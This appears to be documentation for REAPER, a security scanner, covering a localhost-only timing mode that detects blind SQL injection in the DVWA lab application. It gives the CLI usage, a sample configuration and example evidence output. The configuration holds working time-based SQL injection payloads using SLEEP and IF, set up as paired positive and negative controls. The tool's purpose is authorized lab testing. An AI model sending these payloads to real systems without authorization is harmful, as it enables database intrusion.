# Local timing differential evidence

REAPER includes a localhost-only timing evidence engine for authorized lab work such as DVWA.

It is intentionally narrower than `attack` mode:

- target hostname must be `localhost`, `127.0.0.0/8` or `::1`;
- only GET/HEAD requests are allowed;
- redirects and HTTP 5xx responses invalidate a sample;
- session cookies are loaded only from explicitly named environment variables;
- timeouts are recorded as censored observations, never converted into fake durations;
- positive and negative controls are interleaved to reduce drift;
- evidence uses median, median absolute deviation (MAD), a minimum delta and the configured expected-delay ratio;
- total laboratory request budget is capped by configuration validation.

## CLI

```bash
reaper timing http://localhost/dvwa/vulnerabilities/sqli/ \
  --config reaper.config.ts \
  --format terminal
```

JSON, Markdown and SARIF outputs are also supported through the normal REAPER reporter.

## DVWA example

Store the session values outside the config:

```bash
export DVWA_PHPSESSID='...'
export DVWA_SECURITY='low'
```

Then use literal configuration:

```ts
export default {
  timing: {
    authorization: {
      acknowledged: true,
      reference: "DVWA local SQLi laboratory",
    },
    samples: 5,
    timeoutMs: 10000,
    thresholdRatio: 0.8,
    minDeltaMs: 500,
    cookieEnvs: {
      PHPSESSID: "DVWA_PHPSESSID",
      security: "DVWA_SECURITY",
    },
    responseMustInclude: ["SQL Injection"],
    baseline: {
      query: {
        id: "1",
        Submit: "Submit",
      },
    },
    experiments: [
      {
        id: "and-sleep",
        title: "AND SLEEP paired timing control",
        expectedDelayMs: 5000,
        negative: {
          query: {
            id: "1' AND SLEEP(0)-- ",
            Submit: "Submit",
          },
        },
        positive: {
          query: {
            id: "1' AND SLEEP(5)-- ",
            Submit: "Submit",
          },
        },
      },
      {
        id: "boolean-if",
        title: "Boolean IF paired timing control",
        expectedDelayMs: 5000,
        negative: {
          query: {
            id: "1' OR IF(1=2,SLEEP(5),0)-- ",
            Submit: "Submit",
          },
        },
        positive: {
          query: {
            id: "1' OR IF(1=1,SLEEP(5),0)-- ",
            Submit: "Submit",
          },
        },
      },
    ],
  },
};
```

A confirmed experiment emits `REAPER-TIMING-001` with evidence such as:

```text
Baseline median: 82 ms
Negative median: 87 ms
Positive median: 5094 ms
Delta: 5007 ms
Evidence threshold: 4000 ms
Observed MAD jitter: 8 ms
Confidence: HIGH
```

A single slow request is never enough by itself. If the negative control drifts far from the baseline, or too few samples complete, the experiment is reported as inconclusive instead of confirmed.
